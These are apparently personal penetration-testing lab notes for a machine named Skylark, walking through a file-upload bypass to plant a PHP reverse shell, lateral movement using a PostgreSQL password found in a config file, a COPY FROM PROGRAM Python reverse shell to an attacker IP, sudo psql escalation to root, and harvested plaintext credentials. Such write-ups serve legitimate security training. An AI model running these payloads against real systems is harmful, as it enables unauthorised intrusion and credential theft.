### ++ Approach ++
#### Credentials
	* SKYLARK\kiosk:XEwUS^9R2Gwt8O914 (https://192.168.203.221/RDWeb)

#### Services
	##### 21 FTP
		- 

	##### 80 HTTP
		-

	##### 8090 HTTP
		Fuzzing we find a login panel at http://192.168.203.225:8090/backend/default/index.php with admin:admin credentials
		Here we find a upload funtionality which can be exploited

### ++ Vulnerabilities ++

#### Vuln 1: Input not sanitized in uploader function ++
	* In 8090/backend/default/index.php we can upload a php shell and bypass the file protection

#### Vuln 2: User postgres has misconfigured permissions ++
	* After moved laterally to postgres user, we abuse the sudo permissions of psql command

### ++ System Interaction ++
#### Foothold  
	* Use uploader to abuse the functionality and upload a php reverse shell (pentestmonkey shell) and get a foothold as www-data
	
![[Pasted image 20240219110526.png]]
![[Pasted image 20240219110637.png]]

#### Lateral Movement to postgres user
	* In /var/www/backend/default/config.php we find a PostgreSQL db connection command:
		pg_connect("host=localhost port=5432 dbname=webapp user=postgres password=EAZT5EMULA75F8MC");

	* We can connect to psql with the following command:
		psql -h localhost -p 5432 -d webapp -U postgres (Password EAZT5EMULA75F8MC)

	* We can get a shell as postgres user with the following commands (from **[Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce-to-program)**):
		DROP TABLE IF EXISTS cmd_exec;
		CREATE TABLE cmd_exec(cmd_output text);
		COPY cmd_exec FROM PROGRAM 'python3 -c ''import os,pty,socket;s=socket.socket();s.connect(("192.168.45.165",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")''';

#### Privilege Escalation 
	* Postgres user can run psql as sudo, so lets connect to psql again and spawn a shell
		sudo /usr/bin/psql -h localhost -p 5432 -d webapp -U postgres (Password EAZT5EMULA75F8MC)

		(https://gtfobins.github.io/gtfobins/psql/#shell)
		\?
		!/bin/bash

	And we are root
	
#### Post-exploitation 
	* In /var/www/backend/default/uploads/user-guide-rdweb.pdf we found a file which reveals credentials for SKYLARK\kiosk:XEwUS^9R2Gwt8O914
	* By nmap scans we found this webapp is in https://192.168.203.221/RDWeb